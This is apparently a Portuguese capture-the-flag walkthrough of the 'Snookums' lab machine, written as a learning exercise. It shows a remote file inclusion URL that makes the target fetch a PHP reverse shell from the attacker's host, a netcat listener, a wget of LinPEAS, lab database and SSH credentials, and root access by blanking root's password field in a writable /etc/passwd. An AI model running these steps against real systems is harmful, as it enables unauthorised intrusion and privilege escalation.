A Snookums começou com uma galeria de fotos e terminou em um arquivo de contas que eu conseguia editar. No meio do caminho teve inclusão remota de PHP, credencial em arquivo de configuração, banco de dados e duas camadas de Base64. Cada etapa entregou a pista para a próxima.

1 · Reconhecimento

Começo com uma varredura TCP e salvo a saída para consultar durante a resolução. O -A ativa identificação de versões, scripts padrão, estimativas de sistema e traceroute. O -T4 usa uma configuração de tempo mais rápida.

sudo nmap -T4 -A 192.168.222.58 -oN nmap.txt

Também verifico UDP. Não obtive portas abertas nessa varredura, mas isso não prova que não existam serviços UDP: o comando limita a busca às mil portas mais comuns e usa poucas tentativas.

sudo nmap -sU -sV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 192.168.222.58 -Pn

dirsearch -u http://192.168.222.58/

O /images/ ajuda a mapear os arquivos, mas o ponto explorado depois é image.php. Já db.php fica como uma pista para a etapa em que eu tiver acesso ao sistema.

3 · Entendendo a inclusão remota

Encontro o exploit SimplePHPGal 0.7 — Remote File Inclusion, que aponta para o parâmetro img de image.php. A página anuncia 0.8, mas isso não garante que a falha foi corrigida. O que confirma o caminho é o resultado observado na instância.

RFI significa Remote File Inclusion. Aqui, a aplicação recebe uma URL, busca o conteúdo remoto e o inclui no processamento do PHP. Se esse conteúdo contém código PHP e a configuração permite a inclusão, ele pode executar no servidor com a identidade do serviço web.

4 · Reverse shell como apache

Preparo revshell.php no Kali e ajusto o retorno para meu IP da VPN, 192.168.45.167, porta 445. Esses são os campos de configuração da shell PHP; a porta precisa corresponder ao listener.

$ip = '192.168.45.167';
$port = 445;

Deixo dois terminais no Kali: um serve o arquivo PHP como conteúdo estático; o outro recebe a conexão da reverse shell. O servidor HTTP precisa estar no diretório que contém revshell.php.

sudo python3 -m http.server 80
sudo nc -nlvp 445

Acesso a URL abaixo no navegador. Ela manda o alvo buscar o arquivo no Kali. Mantenho o ? final como foi utilizado na minha resolução; ele inicia a query da URL incluída.

http://192.168.222.58/image.php?img=http://192.168.45.167/revshell.php?
Porta do alvo e porta de retorno

Eu havia tentado outras portas e consegui a conexão com 445. Isso não demonstra, por si só, a causa das falhas anteriores. A porta de retorno é a que o Kali escuta; não precisa ser uma porta aberta no alvo. O que importa é o alvo conseguir alcançar o listener e a configuração da shell corresponder a ele.

whoami
hostname
ls /home

Confiro apache como usuário e snookums como hostname. Em /home, encontro michael. Temos acesso inicial, mas ainda falta atravessar os contextos de usuário até root.

5 · Configuração e acesso ao MySQL

Lembro do db.php encontrado na enumeração e leio o arquivo na instalação da aplicação. Pelo navegador, um arquivo PHP normalmente é executado; com a shell, consigo ler seu código e ver a configuração de conexão.

cat db.php

Encontro a credencial root:MalapropDoffUtilize1337, com DBHOST em 127.0.0.1. Esse root é uma conta do MySQL, não uma confirmação da senha do root do Linux. Nas primeiras tentativas não consegui acesso; ao conectar explicitamente ao host local e à porta 3306, entro no banco.

mysql -h 127.0.0.1 -P 3306 -u root -p

Quando o cliente solicita a senha, informo o valor encontrado em db.php. Usar 127.0.0.1 torna explícita a conexão TCP local. Isso pode diferir do comportamento com localhost, que costuma usar um socket Unix. Meu registro não confirma a causa exata das falhas anteriores.

SHOW DATABASES;
USE SimplePHPGal;
SHOW TABLES;
SELECT * FROM users;

6 · Duas camadas de Base64

Os valores terminam com =, o que me dá a ideia de testar Base64. Esse caractere é só uma pista de preenchimento, não uma prova. Ao decodificar, o primeiro resultado ainda parece Base64. Decodifico novamente e encontro as senhas em texto legível.

Base64 é uma codificação reversível, não um hash de senha nem criptografia. Nos comandos abaixo, os dois base64 -d reproduzem as duas etapas em uma única linha.

printf '%s' 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d
printf '%s' 'VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=' | base64 -d | base64 -d
printf '%s' 'VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==' | base64 -d | base64 -d

7 · SSH e enumeração como michael

ssh michael@192.168.222.58

Informo HockSydneyCertify123 quando solicitado. Confirmo a nova identidade e leio a flag local na home. No bloco abaixo, o nome está corrigido para local.txt; a captura também mostra uma primeira tentativa com um erro de digitação.

whoami
hostname
pwd
ls
cat local.txt

Com o servidor HTTP do Kali disponível, transfiro o LinPEAS e executo a enumeração local.

wget http://192.168.45.167/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
sh linpeas.sh

Essa é a pista principal: /etc/passwd deveria permitir leitura geral, mas sua escrita deve ficar restrita ao administrador. Aqui, michael consegue alterá-lo. A falha está nas permissões do arquivo de contas.

8 · Arquivo de contas e acesso root

Consulto uma explicação sobre /etc/passwd e sigo o caminho documentado nas capturas. Cada linha tem sete campos separados por dois-pontos. Na entrada do root, o x indica que a informação de senha está em /etc/shadow.

Abro o arquivo com vi como michael e removo apenas o x do segundo campo da linha do root, deixando os separadores e os demais campos intactos.

vi /etc/passwd

A entrada muda de:

root:x:0:0:root:/root:/bin/bash

Para:

root::0:0:root:/root:/bin/bash

Isso deixa o campo de senha vazio. A aceitação de uma senha vazia depende da configuração de autenticação, incluindo PAM; não é um resultado garantido em qualquer Linux. Nesta instância, o su root passa após a alteração.

A captura também mostra uma tentativa de sudo su negada: michael não está no sudoers. O acesso final vem do su root, possibilitado pela alteração do arquivo, e não de uma autorização no sudo.

su root
whoami
hostname
cat /root/proof.txt

Agora sim: root na Snookums. Pwn3d!

9 · O que levo dessa máquina

O caminho foi RFI → apache → db.php → MySQL → Base64 duas vezes → SSH como michael → /etc/passwd gravável → root. A máquina conectou falhas da aplicação, armazenamento inadequado de senhas, reutilização de credenciais e permissões de arquivo.

  • Testar a hipótese: o número da versão orienta a pesquisa, mas não substitui a validação.
  • Separar os contextos: root no banco não é root no sistema.
  • Entender os dados: Base64 em duas camadas continua sendo codificação reversível.
  • Conferir permissões: um arquivo crítico gravável pode ter mais impacto do que um serviço antigo.

Referências técnicas: Exploit-DB 48424 e manual Linux de passwd(5).
